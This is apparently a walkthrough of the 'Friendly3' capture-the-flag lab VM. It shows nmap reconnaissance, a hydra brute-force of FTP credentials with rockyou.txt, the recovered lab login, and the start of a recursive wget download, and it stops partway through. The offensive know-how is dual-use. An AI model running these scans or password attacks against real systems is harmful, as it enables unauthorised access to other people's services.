Friendly3 Writeups 

<img width="670" height="77" alt="image" src="https://github.com/user-attachments/assets/38fe9b79-b107-41f6-a0d0-016faca21e00" />

We create the directory of Friendly3 in our Desktop 

┌──(clandhacker㉿kali)-[~/Desktop]
└─$ mkdir Friendly3 
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop]
└─$ ls
Archivos  Documentos  Friendly1  Friendly3  Pyphisher  Screenshots  Tools        Youhavebeenhacked
B2E       folder      Friendly2  Payloads   RED_HAWK   sherlock     tor-browser
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop]
└─$ cd Friendly3
                                                                                                                                                           
┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
└─$ 

**Reconaissance**


Now we need to check our target IP Address 

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
└─$ sudo arp-scan -I eth0 --localnet                                         
[sudo] password for clandhacker: 
Interface: eth0, 
192.168.15.10   08:00:27:b8:6f:6a       PCS Systemtechnik GmbH

We confirm the Ping command to see what OS we will be working on

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
└─$ ping 192.168.15.10           
PING 192.168.15.10 (192.168.15.10) 56(84) bytes of data.
64 bytes from 192.168.15.10: icmp_seq=1 ttl=64 time=3.16 ms
64 bytes from 192.168.15.10: icmp_seq=2 ttl=64 time=1.31 ms
64 bytes from 192.168.15.10: icmp_seq=3 ttl=64 time=2.13 ms

This is a Linux computer TTL showing 64 

We run our Nmap command 

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
└─$ nmap -p- --open -sS -sC -sV  -min-rate 5000 -n -Pn -vvv 192.168.15.10 -oN results.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-19 19:47 -0500
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Initiating ARP Ping Scan at 19:47
Scanning 192.168.15.10 [1 port]
Completed ARP Ping Scan at 19:47, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:47
Scanning 192.168.15.10 [65535 ports]
SYN Stealth Scan Timing: About 50.00% done; ETC: 19:48 (0:00:36 remaining)
Discovered open port 22/tcp on 192.168.15.10
Discovered open port 21/tcp on 192.168.15.10
Discovered open port 80/tcp on 192.168.15.10
Completed SYN Stealth Scan at 19:48, 76.23s elapsed (65535 total ports)
Initiating Service scan at 19:48
Scanning 3 services on 192.168.15.10
Completed Service scan at 19:48, 6.11s elapsed (3 services on 1 host)
NSE: Script scanning 192.168.15.10.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:48
Completed NSE at 19:48, 3.30s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:48
Completed NSE at 19:48, 0.11s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:48
Completed NSE at 19:48, 0.00s elapsed
Nmap scan report for 192.168.15.10
Host is up, received arp-response (0.00080s latency).
Scanned at 2026-09-19 19:47:27 CDT for 86s
Not shown: 53055 filtered tcp ports (no-response), 12477 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 bc:46:3d:85:18:bf:c7:bb:14:26:9a:20:6c:d3:39:52 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFC2DVBfq6sqSsCS9Jg+TZN7bqZ4U5G/tKb5dD3M69VVHwPRuMmify8CmxFhlP33nMhZTvYSZIpjGuiPSjks5UA=
|   256 7b:13:5a:46:a5:62:33:09:24:9d:3e:67:b6:eb:3f:a1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICDxFT3mwConXgCXORTtuda6Onx3sMQgZb6CzY2tWc3l
80/tcp open  http    syn-ack ttl 64 nginx 1.22.1
|_http-server-header: nginx/1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
MAC Address: 08:00:27:B8:6F:6A (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:48
Completed NSE at 19:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:48
Completed NSE at 19:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:48
Completed NSE at 19:48, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.43 seconds
           Raw packets sent: 124833 (5.493MB) | Rcvd: 12483 (499.328KB)

We hae open 21, 22, 80 we are going to see what contains the website in the port 80 TCP 

<img width="1359" height="310" alt="image" src="https://github.com/user-attachments/assets/a8936a8d-05ab-4a2f-9dd5-4e40b5b80f53" />

I tried to login using ftp anonymous but it did´t work

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
└─$ ftp 192.168.15.10
Connected to 192.168.15.10.
220 (vsFTPd 3.0.3)
Name (192.168.15.10:clandhacker): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
zsh: suspended  ftp 192.168.15.10

So we need to complete a bruteforce attack using **hydra** with Juan user 

comamnd

 ┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]

 
└─$ hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.15.10 
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-19 20:11:15
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://192.168.15.10:21/
[21][ftp] host: 192.168.15.10   login: juan   password: alexis
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-19 20:11:55

Now we can access to the ftp as juan with a password alexis

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]

└─$ ftp 192.168.15.10
Connected to 192.168.15.10.
220 (vsFTPd 3.0.3)
Name (192.168.15.10:clandhacker): juan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

We are going to download everything from this machine using a command wget 

┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
└─$ wget -r ftp://"juan":"alexis"@192.168.15.10/                                              
--2026-09-19 20:24:10--  ftp://juan:*password*@192.168.15.10/
           => ‘192.168.15.10/.listing’
Connecting to 192.168.15.10:21... connected.
Logging in as juan ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.


